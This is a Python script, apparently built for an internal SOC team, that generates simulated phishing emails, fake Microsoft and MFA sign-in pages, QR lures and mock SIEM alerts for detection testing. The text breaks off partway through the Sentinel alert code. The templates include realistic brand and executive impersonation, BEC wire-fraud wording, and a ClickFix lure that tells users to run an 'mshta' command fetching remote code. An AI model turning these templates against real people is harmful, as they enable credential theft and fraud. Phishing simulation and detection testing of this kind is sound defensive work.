#!/usr/bin/env python3
"""
Phishing Simulation Artifact Generator
Internal SOC Team — Phishing Simulation Lab (Defensive Testing Only)
Generates benign phishing simulations for SOC validation and detection rule testing.

Usage:
    pip install qrcode[pil] Pillow   # optional, for QR images
    python generate_phishing_artifacts.py
    python generate_phishing_artifacts.py --count 5 --url http://phishtest.internal --domain novacorp.com
"""

import os
import json
import base64
import random
import string
import argparse
import uuid
from datetime import datetime, timedelta, timezone
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from email.utils import formatdate

try:
    import qrcode
    from PIL import Image
    QR_AVAILABLE = True
except ImportError:
    QR_AVAILABLE = False

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────────────────────────────────────

CONFIG = {
    "output_dir": "./phishing_artifacts",
    "test_base_url": "http://phishtest.internal",
    "target_company": "NovaCorp",
    "target_domain": "novacorp.com",
    "sender_domains": [
        "microsoft-security.com",
        "docusign-alerts.net",
        "office365-verify.org",
        "fedex-track.info",
        "payroll-secure.net",
        "support-helpdesk.com",
        "invoice-portal.net",
        "mfa-verify.org",
        "shipping-notify.com",
        "accounts-verify.net",
    ],
}

# ─────────────────────────────────────────────────────────────────────────────
# UTILITIES
# ─────────────────────────────────────────────────────────────────────────────

def ensure_dirs(base: str):
    subdirs = [
        "emails/clickfix",
        "emails/credential_harvest",
        "emails/quishing",
        "emails/html_attachment",
        "emails/bec",
        "emails/invoice",
        "emails/delivery",
        "emails/mfa_reset",
        "qr_codes",
        "html_attachments",
        "siem_alerts/elastic",
        "siem_alerts/sentinel",
        "soc_payloads",
        "reports",
    ]
    for d in subdirs:
        os.makedirs(os.path.join(base, d), exist_ok=True)


def random_msgid(domain="test.internal"):
    return f"<{uuid.uuid4().hex[:16]}@{domain}>"


def fake_ip():
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"


def random_date_recent(days=30):
    delta = timedelta(
        days=random.randint(0, days),
        hours=random.randint(0, 23),
        minutes=random.randint(0, 59),
    )
    return datetime.now(timezone.utc) - delta


def save_eml(msg: MIMEMultipart, path: str):
    with open(path, "w", encoding="utf-8") as f:
        f.write(msg.as_string())


def save_json(data: dict, path: str):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, default=str)


def set_headers(msg, sender_name, sender_email, recipient_email, subject, date):
    msg["From"] = f"{sender_name} <{sender_email}>"
    msg["To"] = f"recipient@{recipient_email}" if "@" not in recipient_email else recipient_email
    msg["Subject"] = subject
    msg["Date"] = formatdate(date.timestamp(), localtime=False)
    msg["Message-ID"] = random_msgid(sender_email.split("@")[-1])
    msg["X-Mailer"] = random.choice(
        ["Microsoft Outlook 16.0", "Apple Mail 16.0", "Thunderbird 115.0"]
    )
    msg["X-Originating-IP"] = fake_ip()
    msg["X-Simulation-Type"] = "PHISHING-SIM-BENIGN"
    msg["X-SOC-Test-ID"] = f"SOC-SIM-{uuid.uuid4().hex[:8].upper()}"
    return msg


# ─────────────────────────────────────────────────────────────────────────────
# QR CODE GENERATOR
# ─────────────────────────────────────────────────────────────────────────────

def generate_qr(url: str, output_path: str) -> bool:
    if not QR_AVAILABLE:
        placeholder = output_path.replace(".png", "_placeholder.txt")
        with open(placeholder, "w") as f:
            f.write(f"[QR CODE PLACEHOLDER]\nURL: {url}\n")
            f.write("Install: pip install qrcode[pil] Pillow\n")
        return False
    qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_H, box_size=10, border=4)
    qr.add_data(url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img.save(output_path)
    return True


# ─────────────────────────────────────────────────────────────────────────────
# HTML ATTACHMENT TEMPLATES
# ─────────────────────────────────────────────────────────────────────────────

def html_credential_page(test_url: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Microsoft Sign-In</title>
  <style>
    *{{box-sizing:border-box;margin:0;padding:0}}
    body{{font-family:'Segoe UI',Arial,sans-serif;background:#f3f2f1;display:flex;align-items:center;justify-content:center;min-height:100vh}}
    .card{{background:#fff;padding:44px 44px 36px;max-width:440px;width:100%;box-shadow:0 2px 6px rgba(0,0,0,.12)}}
    .logo{{font-size:22px;color:#0078d4;font-weight:300;margin-bottom:28px}}
    h1{{font-size:18px;font-weight:600;color:#323130;margin-bottom:4px}}
    p{{font-size:13px;color:#605e5c;margin-bottom:20px}}
    input{{width:100%;padding:6px 8px;border:1px solid #8a8886;font-size:15px;margin-bottom:12px;outline:none}}
    input:focus{{border-color:#0078d4;box-shadow:0 0 0 1px #0078d4}}
    .btn{{width:100%;padding:8px;background:#0078d4;color:#fff;border:none;font-size:15px;cursor:pointer}}
    .sim-banner{{margin-top:20px;padding:8px 12px;background:#fff4ce;border:1px solid #f0c040;font-size:11px;color:#7a6000;text-align:center}}
  </style>
</head>
<body>
  <!-- SOC SIMULATION - NON-MALICIOUS -->
  <div class="card">
    <div class="logo">Microsoft</div>
    <h1>Sign in</h1>
    <p>Use your Microsoft account</p>
    <input type="email" placeholder="Email, phone, or Skype" id="u">
    <input type="password" placeholder="Password" id="p">
    <button class="btn" onclick="window.location.href='{test_url}?t=cred&a=submit&u='+document.getElementById('u').value">Next</button>
    <div class="sim-banner">SOC SIMULATION ARTIFACT — Credential entry is not captured or transmitted.</div>
  </div>
</body>
</html>"""


def html_mfa_page(test_url: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Verify your identity</title>
  <style>
    *{{box-sizing:border-box;margin:0;padding:0}}
    body{{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}}
    .card{{background:#fff;padding:36px;max-width:400px;width:100%;border-radius:8px;box-shadow:0 1px 8px rgba(0,0,0,.15)}}
    h2{{color:#1a73e8;font-size:20px;margin-bottom:8px}}
    p{{color:#5f6368;font-size:14px;margin-bottom:20px}}
    input{{width:100%;padding:10px;border:1px solid #dadce0;border-radius:4px;font-size:18px;text-align:center;letter-spacing:10px}}
    .btn{{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:15px;margin-top:14px;cursor:pointer}}
    .sim{{font-size:10px;color:#aaa;margin-top:14px;text-align:center}}
  </style>
</head>
<body>
  <!-- SOC SIMULATION - NON-MALICIOUS -->
  <div class="card">
    <h2>Verify it's you</h2>
    <p>Enter the 6-digit code from your Authenticator app to continue.</p>
    <input type="text" placeholder="000000" maxlength="6" id="code">
    <button class="btn" onclick="window.location.href='{test_url}?t=mfa&a=submit'">Verify</button>
    <div class="sim">SOC SIMULATION — No codes are captured or transmitted.</div>
  </div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# EMAIL GENERATORS  (each returns an artifact dict)
# ─────────────────────────────────────────────────────────────────────────────

def gen_clickfix(out: str, cfg: dict) -> dict:
    """ClickFix-style lure — fake CAPTCHA with clipboard PowerShell payload"""
    msg = MIMEMultipart("alternative")
    date = random_date_recent()
    sender_email = f"helpdesk@{random.choice(cfg['sender_domains'])}"
    set_headers(msg, "IT Help Desk", sender_email,
                f"user@{cfg['target_domain']}",
                "ACTION REQUIRED: Browser Verification to Access Company Portal", date)

    payload_url = f"{cfg['test_base_url']}/clickfix?id=POC{random.randint(1000,9999)}"
    html = f"""<html><body>
<div style="font-family:Calibri,Arial;font-size:14px;max-width:600px;margin:0 auto;">
  <table width="100%" cellpadding="0" cellspacing="0">
    <tr><td style="background:#0078d4;padding:14px 20px;">
      <span style="color:#fff;font-size:16px;font-weight:600;">IT Support Portal</span>
    </td></tr>
    <tr><td style="padding:24px;">
      <p>Your browser session could not be verified. Complete the security check below to restore access.</p>
      <div style="background:#fff8e1;border-left:4px solid #ffc107;padding:12px 16px;margin:16px 0;">
        <strong>Security Verification Required</strong><br>
        Automated bots have been detected from your network segment.
      </div>
      <p>To verify you are human, press <strong>Windows Key + R</strong>, paste the command below, and press <strong>Enter</strong>:</p>
      <div style="background:#1e1e1e;color:#4ec9b0;font-family:monospace;padding:14px;border-radius:4px;word-break:break-all;">
        mshta {payload_url}
      </div>
      <p style="color:#888;font-size:11px;margin-top:20px;">
        [SOC SIMULATION — CLICKFIX LURE — NOT MALICIOUS]
      </p>
    </td></tr>
  </table>
</div></body></html>"""

    msg.attach(MIMEText("IT Support: Browser verification required. [SOC SIMULATION]", "plain"))
    msg.attach(MIMEText(html, "html"))

    fname = f"clickfix_{uuid.uuid4().hex[:8]}.eml"
    fpath = os.path.join(out, "emails/clickfix", fname)
    save_eml(msg, fpath)
    return {"type": "clickfix", "file": fpath, "subject": msg["Subject"],
            "sender": msg["From"], "date": str(date),
            "ioc": {"url": payload_url, "sender_domain": sender_email.split("@")[1],
                    "technique": "clipboard-injection"}}


def gen_credential_harvest(out: str, cfg: dict) -> dict:
    """Credential-harvesting email with embedded link and HTML attachment"""
    msg = MIMEMultipart("mixed")
    date = random_date_recent()
    sender_email = f"security@{random.choice(cfg['sender_domains'])}"
    src_ip = fake_ip()
    country = random.choice(["Russia", "China", "Nigeria", "North Korea", "Vietnam"])
    set_headers(msg, "Microsoft Account Team", sender_email,
                f"user@{cfg['target_domain']}",
                "Microsoft account: Unusual sign-in activity detected", date)

    harvest_url = f"{cfg['test_base_url']}/auth?type=cred&src=email&tid=POC{random.randint(1000,9999)}"
    html = f"""<html><body>
<div style="font-family:'Segoe UI',Arial;max-width:600px;margin:0 auto;">
  <div style="background:#0078d4;padding:16px 24px;"><span style="color:#fff;font-size:20px;font-weight:300;">Microsoft</span></div>
  <div style="padding:24px;">
    <h2 style="font-size:17px;color:#323130;">Unusual sign-in activity</h2>
    <p style="color:#323130;">We detected a sign-in to your Microsoft account from a new location. 
    If this was you, you can ignore this email.</p>
    <table style="border:1px solid #edebe9;width:100%;border-collapse:collapse;margin:16px 0;">
      <tr style="background:#f3f2f1;"><th style="padding:8px 12px;text-align:left;font-size:12px;color:#605e5c;">DETAIL</th>
      <th style="padding:8px 12px;text-align:left;font-size:12px;color:#605e5c;">VALUE</th></tr>
      <tr><td style="padding:8px 12px;">Country/Region</td><td style="padding:8px 12px;"><strong>{country}</strong></td></tr>
      <tr style="background:#f3f2f1;"><td style="padding:8px 12px;">IP Address</td><td style="padding:8px 12px;">{src_ip}</td></tr>
      <tr><td style="padding:8px 12px;">Date/Time</td><td style="padding:8px 12px;">{date.strftime('%B %d, %Y %H:%M UTC')}</td></tr>
      <tr style="background:#f3f2f1;"><td style="padding:8px 12px;">Platform</td><td style="padding:8px 12px;">Windows 11</td></tr>
    </table>
    <p>If you did not sign in, please secure your account immediately:</p>
    <a href="{harvest_url}" style="display:inline-block;background:#0078d4;color:#fff;padding:10px 24px;text-decoration:none;border-radius:2px;font-size:14px;">
      Review Recent Activity
    </a>
    <p style="color:#888;font-size:11px;margin-top:24px;">[SOC SIMULATION — CREDENTIAL HARVEST — ]</p>
  </div>
</div></body></html>"""

    msg.attach(MIMEText(html, "html"))

    # HTML attachment
    attach_html = html_credential_page(cfg["test_base_url"])
    part = MIMEBase("text", "html")
    part.set_payload(attach_html.encode())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment", filename="SecureDocument.html")
    msg.attach(part)

    fname = f"credential_harvest_{uuid.uuid4().hex[:8]}.eml"
    fpath = os.path.join(out, "emails/credential_harvest", fname)
    save_eml(msg, fpath)
    return {"type": "credential_harvest", "file": fpath, "subject": msg["Subject"],
            "sender": msg["From"], "date": str(date),
            "ioc": {"url": harvest_url, "src_ip": src_ip, "country": country,
                    "attachment": "SecureDocument.html"}}


def gen_quishing(out: str, cfg: dict) -> dict:
    """QR code phishing (quishing) — MFA re-auth lure"""
    msg = MIMEMultipart("related")
    alt = MIMEMultipart("alternative")
    date = random_date_recent()
    sender_email = f"auth-noreply@{random.choice(cfg['sender_domains'])}"
    qr_url = f"{cfg['test_base_url']}/qr?type=mfa&sid=POC{random.randint(1000,9999)}"
    set_headers(msg, "Microsoft Authenticator", sender_email,
                f"user@{cfg['target_domain']}",
                "Action Required: Scan QR Code to Re-Authenticate Your Account", date)

    # Generate QR image
    qr_fname = f"qr_{uuid.uuid4().hex[:8]}.png"
    qr_fpath = os.path.join(out, "qr_codes", qr_fname)
    qr_generated = generate_qr(qr_url, qr_fpath)

    html = f"""<html><body>
<div style="font-family:'Segoe UI',Arial;max-width:600px;margin:0 auto;">
  <div style="background:#0078d4;padding:16px 24px;">
    <span style="color:#fff;font-size:18px;">Microsoft Authenticator</span>
  </div>
  <div style="padding:28px;">
    <h2 style="font-size:17px;color:#323130;margin-bottom:6px;">Re-authentication Required</h2>
    <p style="color:#605e5c;">Your MFA session has expired. Scan the QR code below with your 
    Microsoft Authenticator app to restore access to company resources.</p>
    <div style="text-align:center;padding:24px;background:#f3f2f1;border-radius:4px;margin:20px 0;">
      {'<img src="cid:qrimage" alt="QR Code" style="width:200px;height:200px;" />' if qr_generated else f'<p style="font-family:monospace;word-break:break-all;font-size:11px;">[QR CODE — URL: {qr_url}]</p>'}
      <p style="font-size:12px;color:#605e5c;margin-top:8px;">QR Code expires in 10 minutes</p>
    </div>
    <p style="font-size:12px;color:#605e5c;">Cannot scan? <a href="{qr_url}">Click here instead</a></p>
    <p style="color:#aaa;font-size:11px;margin-top:20px;">[SOC SIMULATION — QUISHING —  QR URL: {qr_url}]</p>
  </div>
</div></body></html>"""

    alt.attach(MIMEText("Microsoft Authenticator: MFA session expired. Scan QR to re-authenticate. [SOC SIMULATION]", "plain"))
    alt.attach(MIMEText(html, "html"))
    msg.attach(alt)

    if qr_generated and os.path.exists(qr_fpath):
        with open(qr_fpath, "rb") as f:
            img = MIMEBase("image", "png")
            img.set_payload(f.read())
            encoders.encode_base64(img)
            img.add_header("Content-ID", "<qrimage>")
            img.add_header("Content-Disposition", "inline", filename=qr_fname)
            msg.attach(img)

    fname = f"quishing_{uuid.uuid4().hex[:8]}.eml"
    fpath = os.path.join(out, "emails/quishing", fname)
    save_eml(msg, fpath)
    return {"type": "quishing", "file": fpath, "qr_file": qr_fpath,
            "subject": msg["Subject"], "sender": msg["From"], "date": str(date),
            "ioc": {"qr_url": qr_url, "sender_domain": sender_email.split("@")[1]}}


def gen_html_attachment(out: str, cfg: dict) -> dict:
    """HTML attachment phishing — DocuSign lure"""
    msg = MIMEMultipart("mixed")
    date = random_date_recent()
    sender_email = f"dse@{random.choice(cfg['sender_domains'])}"
    inv_ref = f"DS-{random.randint(10000,99999)}"
    set_headers(msg, "DocuSign", sender_email,
                f"user@{cfg['target_domain']}",
                f"DocuSign: {cfg['target_company']} — Please Review and Sign: {inv_ref}", date)

    html = f"""<html><body>
<div style="font-family:Arial;max-width:600px;margin:0 auto;">
  <div style="background:#ffb703;padding:14px 20px;display:flex;align-items:center;">
    <span style="font-size:22px;font-weight:700;color:#000;">DocuSign</span>
  </div>
  <div style="padding:24px;">
    <p style="font-size:16px;"><strong>{cfg['target_company']}</strong> sent you a document to review and sign.</p>
    <div style="border:1px solid #e2e8f0;padding:16px;border-radius:4px;margin:16px 0;background:#f7fafc;">
      <p><strong>Document:</strong> Vendor Agreement — {inv_ref}</p>
      <p><strong>Expires:</strong> {(date + timedelta(days=3)).strftime('%B %d, %Y')}</p>
    </div>
    <p>Open the attached file to access your secure document portal.</p>
    <p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — HTML ATTACHMENT — ]</p>
  </div>
</div></body></html>"""

    attach_content = html_credential_page(cfg["test_base_url"])
    attach_fname = f"DocuSign_{inv_ref}.html"
    attach_fpath = os.path.join(out, "html_attachments", attach_fname)
    with open(attach_fpath, "w", encoding="utf-8") as f:
        f.write(attach_content)

    part = MIMEBase("text", "html")
    part.set_payload(attach_content.encode())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment", filename=attach_fname)

    msg.attach(MIMEText(html, "html"))
    msg.attach(part)

    fname = f"html_attach_{uuid.uuid4().hex[:8]}.eml"
    fpath = os.path.join(out, "emails/html_attachment", fname)
    save_eml(msg, fpath)
    return {"type": "html_attachment", "file": fpath, "attachment_file": attach_fpath,
            "subject": msg["Subject"], "sender": msg["From"], "date": str(date),
            "ioc": {"attachment": attach_fname, "sender_domain": sender_email.split("@")[1]}}


def gen_bec(out: str, cfg: dict) -> dict:
    """Business Email Compromise — executive wire transfer request"""
    msg = MIMEMultipart("alternative")
    date = random_date_recent()
    execs = [("James Wilson", "CEO"), ("Sarah Chen", "CFO"),
             ("Michael Roberts", "COO"), ("David Kumar", "Managing Director")]
    exec_name, exec_title = random.choice(execs)
    sender_email = f"{exec_name.lower().replace(' ','.')}{random.randint(10,99)}@{random.choice(cfg['sender_domains'])}"
    set_headers(msg, f"{exec_name} — {exec_title}", sender_email,
                f"finance@{cfg['target_domain']}",
                "Urgent: Wire Transfer — Confidential", date)

    amount = random.randint(25000, 200000)
    bank = random.choice(["First National Bank", "Citibank N.A.", "HSBC Holdings", "JPMorgan Chase"])
    acct_hint = f"****{random.randint(1000,9999)}"
    ref = f"VENDOR-{random.randint(1000,9999)}"

    text = f"""Hi,

I need a wire transfer processed today. Time-sensitive — please handle before EOD.
Do not discuss with anyone else until completed.

Amount: ${amount:,}
Bank: {bank}
Account (last 4): {acct_hint}
Reference: {ref}

I'm in back-to-back meetings but will check messages. Confirm once initiated.

{exec_name}
{exec_title}, {cfg['target_company']}

[SOC SIMULATION — BEC — NOT MALICIOUS]"""

    html = f"""<html><body>
<div style="font-family:Calibri,Arial;font-size:14px;max-width:600px;">
  <p>Hi,</p>
  <p>I need a wire transfer processed today. Time-sensitive — please handle before EOD.
  Do not discuss with anyone else until completed.</p>
  <table style="border:1px solid #e2e8f0;border-radius:4px;padding:12px;margin:16px 0;border-collapse:collapse;">
    <tr style="background:#f7fafc;"><td style="padding:8px 12px;"><strong>Amount</strong></td>
    <td style="padding:8px 12px;font-size:16px;font-weight:700;color:#e53e3e;">${amount:,}</td></tr>
    <tr><td style="padding:8px 12px;"><strong>Bank</strong></td><td style="padding:8px 12px;">{bank}</td></tr>
    <tr style="background:#f7fafc;"><td style="padding:8px 12px;"><strong>Account</strong></td>
    <td style="padding:8px 12px;">{acct_hint}</td></tr>
    <tr><td style="padding:8px 12px;"><strong>Reference</strong></td><td style="padding:8px 12px;">{ref}</td></tr>
  </table>
  <p>I'm in back-to-back meetings but will check messages. Confirm once initiated.</p>
  <p><strong>{exec_name}</strong><br>{exec_title}, {cfg['target_company']}</p>
  <p style="font-size:10px;color:#aaa;">[SOC SIMULATION — BEC — ]</p>
</div></body></html>"""

    msg.attach(MIMEText(text, "plain"))
    msg.attach(MIMEText(html, "html"))

    fname = f"bec_{uuid.uuid4().hex[:8]}.eml"
    fpath = os.path.join(out, "emails/bec", fname)
    save_eml(msg, fpath)
    return {"type": "bec", "file": fpath, "exec_impersonated": f"{exec_name} ({exec_title})",
            "subject": msg["Subject"], "sender": msg["From"], "date": str(date),
            "ioc": {"amount": f"${amount:,}", "bank": bank, "sender_domain": sender_email.split("@")[1]}}


def gen_invoice(out: str, cfg: dict) -> dict:
    """Invoice/payment phishing — urgent payment lure"""
    msg = MIMEMultipart("alternative")
    date = random_date_recent()
    vendor = random.choice(["CloudTech Solutions", "DataStream Inc", "SecureNet Services", "TechVault Corp"])
    sender_email = f"billing@{random.choice(cfg['sender_domains'])}"
    inv_num = f"INV-{random.randint(10000,99999)}"
    amount = random.randint(800, 18000)
    due = (date + timedelta(days=2)).strftime("%B %d, %Y")
    set_headers(msg, f"{vendor} Billing", sender_email,
                f"accounts@{cfg['target_domain']}",
                f"OVERDUE: Invoice {inv_num} — ${amount:,} Due {due}", date)

    pay_url = f"{cfg['test_base_url']}/invoice?inv={inv_num}&t=POC"
    html = f"""<html><body>
<div style="font-family:Arial;max-width:600px;margin:0 auto;">
  <div style="background:#1a202c;padding:18px 24px;">
    <span style="color:#fff;font-size:18px;font-weight:700;">{vendor}</span>
  </div>
  <div style="padding:24px;background:#f7fafc;">
    <div style="background:#fff3cd;border:1px solid #ffc107;padding:12px 16px;border-radius:4px;margin-bottom:16px;">
      <strong>Payment Overdue — Action Required</strong>
    </div>
    <table style="width:100%;border-collapse:collapse;margin-bottom:20px;">
      <tr style="background:#fff;"><td style="padding:10px 0;border-bottom:1px solid #e2e8f0;"><strong>Invoice #</strong></td>
      <td style="padding:10px 0;border-bottom:1px solid #e2e8f0;">{inv_num}</td></tr>
      <tr><td style="padding:10px 0;border-bottom:1px solid #e2e8f0;"><strong>Amount Due</strong></td>
      <td style="padding:10px 0;border-bottom:1px solid #e2e8f0;font-size:20px;font-weight:700;color:#e53e3e;">${amount:,}.00</td></tr>
      <tr style="background:#fff;"><td style="padding:10px 0;"><strong>Due Date</strong></td>
      <td style="padding:10px 0;color:#e53e3e;">{due} (OVERDUE)</td></tr>
    </table>
    <a href="{pay_url}" style="background:#e53e3e;color:#fff;padding:12px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:700;">
      Pay Now — Avoid Penalty
    </a>
    <p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — INVOICE PHISHING — ]</p>
  </div>
</div></body></html>"""

    msg.attach(MIMEText(html, "html"))
    fname = f"invoice_{uuid.uuid4().hex[:8]}.eml"
    fpath = os.path.join(out, "emails/invoice", fname)
    save_eml(msg, fpath)
    return {"type": "invoice", "file": fpath, "vendor": vendor, "invoice": inv_num,
            "subject": msg["Subject"], "sender": msg["From"], "date": str(date),
            "ioc": {"url": pay_url, "amount": f"${amount:,}", "invoice_number": inv_num}}


def gen_delivery(out: str, cfg: dict) -> dict:
    """Delivery/shipping phishing — customs fee lure"""
    msg = MIMEMultipart("alternative")
    date = random_date_recent()
    carrier = random.choice(["FedEx", "DHL", "UPS", "India Post"])
    sender_email = f"tracking@{random.choice(cfg['sender_domains'])}"
    tracking = "".join(random.choices(string.digits, k=12))
    fee = random.randint(250, 2500)
    set_headers(msg, f"{carrier} Delivery", sender_email,
                f"user@{cfg['target_domain']}",
                f"{carrier}: Package Held — Customs Fee Required — #{tracking}", date)

    pay_url = f"{cfg['test_base_url']}/delivery?track={tracking}&t=POC"
    carrier_colors = {"FedEx": "#4d148c", "DHL": "#FFCC00", "UPS": "#351c75", "India Post": "#c0392b"}
    bg = carrier_colors.get(carrier, "#333")
    txt_color = "#000" if carrier == "DHL" else "#fff"

    html = f"""<html><body>
<div style="font-family:Arial;max-width:600px;margin:0 auto;">
  <div style="background:{bg};padding:16px 24px;">
    <span style="color:{txt_color};font-size:20px;font-weight:700;">{carrier}</span>
  </div>
  <div style="padding:24px;">
    <h2 style="font-size:16px;color:#333;">Delivery Attempt Failed — Action Required</h2>
    <p>Your package requires customs clearance before delivery can proceed.</p>
    <div style="border:1px solid #e2e8f0;padding:16px;border-radius:4px;margin:16px 0;">
      <p><strong>Tracking:</strong> {tracking}</p>
      <p><strong>Status:</strong> <span style="color:orange;font-weight:600;">HELD — Awaiting Payment</span></p>
      <p><strong>Customs Fee:</strong> <strong style="color:#e53e3e;font-size:18px;">₹{fee:,}</strong></p>
    </div>
    <a href="{pay_url}" style="background:#ff6600;color:#fff;padding:10px 24px;text-decoration:none;border-radius:4px;display:inline-block;">
      Pay Fee & Reschedule Delivery
    </a>
    <p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — DELIVERY PHISHING — ]</p>
  </div>
</div></body></html>"""

    msg.attach(MIMEText(html, "html"))
    fname = f"delivery_{uuid.uuid4().hex[:8]}.eml"
    fpath = os.path.join(out, "emails/delivery", fname)
    save_eml(msg, fpath)
    return {"type": "delivery", "file": fpath, "carrier": carrier, "tracking": tracking,
            "subject": msg["Subject"], "sender": msg["From"], "date": str(date),
            "ioc": {"url": pay_url, "tracking": tracking, "fee": f"₹{fee:,}"}}


def gen_mfa_reset(out: str, cfg: dict) -> dict:
    """MFA reset / account verification phishing"""
    msg = MIMEMultipart("mixed")
    date = random_date_recent()
    sender_email = f"security-noreply@{random.choice(cfg['sender_domains'])}"
    token = uuid.uuid4().hex[:24].upper()
    set_headers(msg, "IT Security — Account Alert", sender_email,
                f"user@{cfg['target_domain']}",
                "[ACTION REQUIRED] Your MFA Settings Were Changed — Verify Now", date)

    verify_url = f"{cfg['test_base_url']}/mfa-reset?token={token}&t=POC"
    html = f"""<html><body>
<div style="font-family:'Segoe UI',Arial;max-width:600px;margin:0 auto;">
  <div style="background:#0078d4;padding:16px 24px;">
    <span style="color:#fff;font-size:18px;">IT Security</span>
  </div>
  <div style="padding:24px;">
    <div style="background:#fde8e8;border:1px solid #f56565;padding:14px 16px;border-radius:4px;margin-bottom:16px;">
      <strong style="color:#c53030;">Security Alert</strong><br>
      Your multi-factor authentication settings were modified on {date.strftime('%B %d, %Y at %H:%M UTC')}.
    </div>
    <p>If this was not you, your account may be compromised. Verify your identity immediately.</p>
    <a href="{verify_url}" style="background:#e53e3e;color:#fff;padding:12px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:700;">
      Secure My Account Now
    </a>
    <p style="color:#718096;font-size:13px;margin-top:16px;">
      This link expires in <strong>15 minutes</strong>.<br>Reference: {token[:12]}...
    </p>
    <p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — MFA RESET PHISHING — ]</p>
  </div>
</div></body></html>"""

    attach_content = html_mfa_page(cfg["test_base_url"])
    part = MIMEBase("text", "html")
    part.set_payload(attach_content.encode())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment", filename="MFA_Verification.html")

    msg.attach(MIMEText(html, "html"))
    msg.attach(part)

    fname = f"mfa_reset_{uuid.uuid4().hex[:8]}.eml"
    fpath = os.path.join(out, "emails/mfa_reset", fname)
    save_eml(msg, fpath)
    return {"type": "mfa_reset", "file": fpath, "token": token,
            "subject": msg["Subject"], "sender": msg["From"], "date": str(date),
            "ioc": {"url": verify_url, "token_prefix": token[:12],
                    "attachment": "MFA_Verification.html"}}


# ─────────────────────────────────────────────────────────────────────────────
# SIEM ALERT GENERATORS
# ─────────────────────────────────────────────────────────────────────────────

ALERT_META = {
    "clickfix":           ("Suspicious ClickFix Lure in Email Body",        "high",     "T1566.001", "Spearphishing Attachment"),
    "credential_harvest": ("Phishing Link Detected — Credential Harvesting", "high",     "T1566.002", "Spearphishing Link"),
    "quishing":           ("QR Code Phishing (Quishing) Detected",           "medium",   "T1566.001", "Phishing"),
    "html_attachment":    ("Malicious HTML Attachment — Phishing Email",     "high",     "T1566.001", "Spearphishing Attachment"),
    "bec":                ("Business Email Compromise Pattern Detected",      "critical", "T1566.002", "Phishing via BEC"),
    "invoice":            ("Invoice/Payment Phishing Email Detected",        "medium",   "T1566.001", "Phishing"),
    "delivery":           ("Delivery Notification Phishing Detected",        "low",      "T1566.001", "Phishing"),
    "mfa_reset":          ("MFA Reset Phishing — Urgency Lure",              "high",     "T1566.002", "Spearphishing Link"),
}


def gen_elastic_alert(artifact: dict, cfg: dict) -> dict:
    rule_name, severity, mitre_id, mitre_name = ALERT_META.get(
        artifact["type"], ("Unknown Phishing Email", "medium", "T1566", "Phishing"))
    return {
        "@timestamp": datetime.now(timezone.utc).isoformat(),
        "kibana.alert.uuid": uuid.uuid4().hex,
        "kibana.alert.rule.name": rule_name,
        "kibana.alert.rule.category": "Custom Query Rule",
        "kibana.alert.severity": severity,
        "kibana.alert.status": "active",
        "kibana.alert.workflow_status": "open",
        "event": {"kind": "signal", "category": "email", "type": ["indicator"]},
        "threat": [{
            "framework": "MITRE ATT\u0026CK",
            "tactic": {"id": "TA0001", "name": "Initial Access",
                       "reference": "https://attack.mitre.org/tactics/TA0001/"},
            "technique": [{"id": mitre_id, "name": mitre_name,
                           "reference": f"https://attack.mitre.org/techniques/{mitre_id.replace('.','/')}/"}],
        }],
        "email": {
            "from": {"address": artifact.get("sender", "")},
            "to": {"address": f"user@{cfg['target_domain']}"},
            "subject": artifact.get("subject", ""),
            "message_id": random_msgid(),
        },
        "source": {
            "ip": artifact.get("ioc", {}).get("src_ip", fake_ip()),
            "geo": {"country_name": artifact.get("ioc", {}).get("country", "Unknown")},
        },
        "url": {"full": artifact.get("ioc", {}).get("url",
                        artifact.get("ioc", {}).get("qr_url", cfg["test_base_url"]))},
        "labels": {
            "simulation": "true", "poc": "soc-sim",
            "phishing_type": artifact["type"],
            "eml_file": os.path.basename(artifact.get("file", "")),
        },
        "tags": ["phishing", "poc-simulation", "soc-sim", artifact["type"]],
    }


def gen_sentinel_alert(artifact: dict, cfg: dict) -> dict:
    sev_map = {"clickfix":"High","credential_harvest":"High","quishing":"Medium",
               "html_attachment":"High","bec":"High","invoice":"Medium",
               "delivery":"Low","mfa_reset":"High"}
    _, _, mitre_id, _ = ALERT_META.get(artifact["type"], ("","medium","T1566",""))
    return {
        "TimeGenerated": datetime.now(timezone.utc).isoformat(),
        "SystemAlertId": str(uuid.uuid4()),
        "AlertName": f"[SIM] Phishing: {artifact['type'].replace('_',' ').title()}",
        "AlertSeverity": sev_map.get(artifact["type"], "Medium"),
        "Status": "New",
        "ProviderName": "Microsoft Defender for Office 365",
        "ProductName": "Microsoft Defender for Office 365",
        "ProductComponentName": "Email Protection",
        "Description": f"[POC SIMULATION] Phishing email detected. Category: {artifact['type']}.",
        "Tactics": "InitialAccess",
        "Techniques": mitre_id,
        "Entities": json.dumps([
            {"Type": "mailMessage",
             "Subject": artifact.get("subject",""),
             "Sender": artifact.get("sender","")},
            {"Type": "url",
             "Url": artifact.get("ioc",{}).get("url",
                   artifact.get("ioc",{}).get("qr_url", cfg["test_base_url"]))},
        ]),
        "ExtendedProperties": json.dumps({
            "SimulationType": artifact["type"],
